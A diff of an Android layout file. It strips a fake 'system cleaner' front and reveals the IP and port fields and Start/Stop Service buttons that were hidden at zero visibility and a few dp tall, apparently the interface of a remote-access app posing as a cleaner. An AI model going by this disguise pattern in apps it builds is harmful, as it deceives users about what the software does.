@@ -5,38 +5,23 @@
     android:orientation="vertical"
     android:background="@drawable/back" >
 
-    <ImageView
-        android:id="@+id/imageView1"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_weight="0.46"
-        android:src="@drawable/clean" />
-
     <TextView
         android:id="@+id/textView1"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:layout_weight="0.46"
+
         android:gravity="center_horizontal"
         android:paddingTop="10dp"
-        android:text="Press start for remove the unnecessary files from the system. This app will automatically uninstall."
+        android:text="Press start. This app will automatically uninstall."
         android:textSize="18sp"
         android:textStyle="bold" />
 
-    <Button
-        android:id="@+id/button1"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:layout_weight="0.46"
-        android:text="Avvia Pulizia!" 
-        android:onClick="onClickBtn" />
 
     <SurfaceView
         android:id="@+id/surfaceView1"
         android:layout_width="100dp"
         android:layout_height="100dp"
-        android:layout_weight="0.46"
-        android:visibility="invisible" />
+ />
 
     <ProgressBar
         android:id="@+id/progressBar1"
@@ -54,14 +39,15 @@
             android:layout_width="wrap_content"
             android:layout_height="fill_parent"
             android:text="IP : "
-            android:visibility="invisible" />
+ />
 
         <EditText
             android:id="@+id/ipfield"
             android:layout_width="fill_parent"
-            android:layout_height="14dp"
+            android:layout_height="wrap_content"
             android:text="192.168.0.12"
-            android:visibility="invisible" />
+            android:inputType="number"
+ />
 
     </LinearLayout>
 
@@ -75,29 +61,34 @@
             android:layout_width="wrap_content"
             android:layout_height="fill_parent"
             android:text="Port : "
-            android:visibility="invisible" />
+ />
 
         <EditText
             android:id="@+id/portfield"
             android:layout_width="fill_parent"
-            android:layout_height="6dp"
+            android:layout_height="wrap_content"
             android:text="9999"
-            android:visibility="invisible" />
+            android:inputType="number"
+
+/>
 
     </LinearLayout>
 
     <Button
         android:id="@+id/buttonstart"
         android:layout_width="match_parent"
-        android:layout_height="10dp"
+        android:layout_height="wrap_content"
         android:text="Start Service"
-        android:visibility="invisible" />
+        android:onClick="onClickBtn"
+/>
 
     <Button
         android:id="@+id/buttonstop"
         android:layout_width="match_parent"
-        android:layout_height="12dp"
+        android:layout_height="wrap_content"
         android:text="Stop Service"
-        android:visibility="invisible" />
+        android:onClick="onStopClick"
+ />
+
 
 </LinearLayout>
